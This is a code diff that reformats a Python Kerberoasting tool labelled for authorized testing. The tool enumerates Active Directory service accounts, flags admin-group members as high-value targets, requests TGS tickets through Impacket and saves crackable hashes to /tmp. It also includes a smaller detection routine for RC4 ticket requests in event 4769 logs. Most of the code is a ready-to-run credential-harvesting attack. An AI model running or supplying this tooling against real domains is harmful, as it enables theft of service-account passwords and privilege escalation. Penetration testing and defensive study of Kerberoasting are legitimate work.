@@ -9,10 +9,19 @@ from pathlib import Path
 
 def enumerate_spn_accounts(domain=None):
     """Enumerate service principal name (SPN) accounts via LDAP query."""
-    cmd = ["ldapsearch", "-x", "-H", f"ldap://{domain}" if domain else "ldap://localhost",
-           "-b", f"dc={',dc='.join(domain.split('.'))}" if domain else "",
-           "(&(objectClass=user)(servicePrincipalName=*))",
-           "sAMAccountName", "servicePrincipalName", "memberOf", "pwdLastSet"]
+    cmd = [
+        "ldapsearch",
+        "-x",
+        "-H",
+        f"ldap://{domain}" if domain else "ldap://localhost",
+        "-b",
+        f"dc={',dc='.join(domain.split('.'))}" if domain else "",
+        "(&(objectClass=user)(servicePrincipalName=*))",
+        "sAMAccountName",
+        "servicePrincipalName",
+        "memberOf",
+        "pwdLastSet",
+    ]
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         accounts = []
@@ -30,9 +39,14 @@ def enumerate_spn_accounts(domain=None):
                 current.setdefault("groups", []).append(line.split(":", 1)[1].strip())
         if current and current.get("username"):
             accounts.append(current)
-        high_value = [a for a in accounts if any("admin" in g.lower() for g in a.get("groups", []))]
+        high_value = [
+            a
+            for a in accounts
+            if any("admin" in g.lower() for g in a.get("groups", []))
+        ]
         return {
-            "domain": domain, "total_spn_accounts": len(accounts),
+            "domain": domain,
+            "total_spn_accounts": len(accounts),
             "high_value_targets": len(high_value),
             "accounts": accounts[:30],
         }
@@ -44,17 +58,27 @@ def enumerate_spn_accounts(domain=None):
 
 def _powershell_spn_enum(domain):
     """Fallback SPN enumeration via PowerShell Get-ADUser."""
-    cmd = ["powershell", "-Command",
-           "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,MemberOf,PasswordLastSet | "
-           "Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,@{N='Groups';E={$_.MemberOf}} | "
-           "ConvertTo-Json -Depth 3"]
+    cmd = [
+        "powershell",
+        "-Command",
+        "Get-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,MemberOf,PasswordLastSet | "
+        "Select-Object SamAccountName,ServicePrincipalName,PasswordLastSet,@{N='Groups';E={$_.MemberOf}} | "
+        "ConvertTo-Json -Depth 3",
+    ]
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         data = json.loads(result.stdout)
         if isinstance(data, dict):
             data = [data]
-        accounts = [{"username": a.get("SamAccountName"), "spns": a.get("ServicePrincipalName", []),
-                      "password_last_set": a.get("PasswordLastSet"), "groups": a.get("Groups", [])} for a in data]
+        accounts = [
+            {
+                "username": a.get("SamAccountName"),
+                "spns": a.get("ServicePrincipalName", []),
+                "password_last_set": a.get("PasswordLastSet"),
+                "groups": a.get("Groups", []),
+            }
+            for a in data
+        ]
         return {"total_spn_accounts": len(accounts), "accounts": accounts[:30]}
     except Exception as e:
         return {"error": f"PowerShell fallback failed: {e}"}
@@ -62,8 +86,15 @@ def _powershell_spn_enum(domain):
 
 def request_tgs_tickets(domain, username=None):
     """Request TGS tickets for Kerberoasting using Impacket GetUserSPNs."""
-    cmd = ["python3", "-m", "impacket.examples.GetUserSPNs",
-           f"{domain}/", "-request", "-outputfile", "/tmp/kerberoast_hashes.txt"]
+    cmd = [
+        "python3",
+        "-m",
+        "impacket.examples.GetUserSPNs",
+        f"{domain}/",
+        "-request",
+        "-outputfile",
+        "/tmp/kerberoast_hashes.txt",
+    ]
     if username:
         cmd += ["-target-user", username]
     try:
@@ -74,11 +105,18 @@ def request_tgs_tickets(domain, username=None):
             for line in hash_file.read_text().strip().splitlines():
                 if line.startswith("$krb5tgs$"):
                     parts = line.split("$")
-                    hashes.append({"hash_type": "krb5tgs", "spn": parts[3] if len(parts) > 3 else "",
-                                   "hash_preview": line[:80] + "..."})
+                    hashes.append(
+                        {
+                            "hash_type": "krb5tgs",
+                            "spn": parts[3] if len(parts) > 3 else "",
+                            "hash_preview": line[:80] + "...",
+                        }
+                    )
         return {
-            "domain": domain, "hashes_captured": len(hashes),
-            "output": result.stdout[:500], "hashes": hashes[:20],
+            "domain": domain,
+            "hashes_captured": len(hashes),
+            "output": result.stdout[:500],
+            "hashes": hashes[:20],
             "hash_file": str(hash_file) if hashes else None,
         }
     except FileNotFoundError:
@@ -90,7 +128,11 @@ def request_tgs_tickets(domain, username=None):
 def analyze_kerberoast_hashes(hash_file):
     """Analyze captured Kerberoast hashes."""
     content = Path(hash_file).read_text(encoding="utf-8", errors="replace")
-    hashes = [line.strip() for line in content.splitlines() if line.strip().startswith("$krb5tgs$")]
+    hashes = [
+        line.strip()
+        for line in content.splitlines()
+        if line.strip().startswith("$krb5tgs$")
+    ]
     enc_types = {"23": 0, "17": 0, "18": 0}
     spns = []
     for h in hashes:
@@ -107,7 +149,11 @@ def analyze_kerberoast_hashes(hash_file):
         "aes_hashes": enc_types.get("17", 0) + enc_types.get("18", 0),
         "spn_targets": spns[:20],
         "risk": "HIGH" if crackable_rc4 > 0 else "MEDIUM",
-        "recommendation": "Disable RC4 (etype 23) and enforce AES encryption" if crackable_rc4 > 0 else "AES encryption in use — harder to crack",
+        "recommendation": (
+            "Disable RC4 (etype 23) and enforce AES encryption"
+            if crackable_rc4 > 0
+            else "AES encryption in use — harder to crack"
+        ),
     }
 
 
@@ -127,25 +173,48 @@ def detect_kerberoasting(evtx_file=None):
                 ns = {"e": "http://schemas.microsoft.com/win/2004/08/events/event"}
                 event_id = root.find(".//e:EventID", ns)
                 if event_id is not None and event_id.text == "4769":
-                    data = {d.get("Name"): d.text for d in root.findall(".//e:Data", ns)}
+                    data = {
+                        d.get("Name"): d.text for d in root.findall(".//e:Data", ns)
+                    }
                     ticket_enc = data.get("TicketEncryptionType", "")
                     if ticket_enc == "0x17":
-                        suspicious.append({
-                            "service": data.get("ServiceName"), "client": data.get("TargetUserName"),
-                            "ip": data.get("IpAddress"), "encryption": "RC4 (0x17)",
-                        })
-        return {"evtx_file": evtx_file, "suspicious_tgs_requests": len(suspicious), "events": suspicious[:20]}
-    cmd = ["wevtutil", "qe", "Security", "/q:*[System[EventID=4769]]", "/f:text", "/c:100"]
+                        suspicious.append(
+                            {
+                                "service": data.get("ServiceName"),
+                                "client": data.get("TargetUserName"),
+                                "ip": data.get("IpAddress"),
+                                "encryption": "RC4 (0x17)",
+                            }
+                        )
+        return {
+            "evtx_file": evtx_file,
+            "suspicious_tgs_requests": len(suspicious),
+            "events": suspicious[:20],
+        }
+    cmd = [
+        "wevtutil",
+        "qe",
+        "Security",
+        "/q:*[System[EventID=4769]]",
+        "/f:text",
+        "/c:100",
+    ]
     try:
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
         rc4_count = result.stdout.lower().count("0x17")
-        return {"source": "live_event_log", "total_4769_events": result.stdout.count("Event ID"), "rc4_ticket_requests": rc4_count}
+        return {
+            "source": "live_event_log",
+            "total_4769_events": result.stdout.count("Event ID"),
+            "rc4_ticket_requests": rc4_count,
+        }
     except Exception as e:
         return {"error": str(e)}
 
 
 def main():
-    parser = argparse.ArgumentParser(description="Kerberoasting Attack Agent (Authorized Testing Only)")
+    parser = argparse.ArgumentParser(
+        description="Kerberoasting Attack Agent (Authorized Testing Only)"
+    )
     sub = parser.add_subparsers(dest="command")
     e = sub.add_parser("enum", help="Enumerate SPN accounts")
     e.add_argument("--domain", required=True)
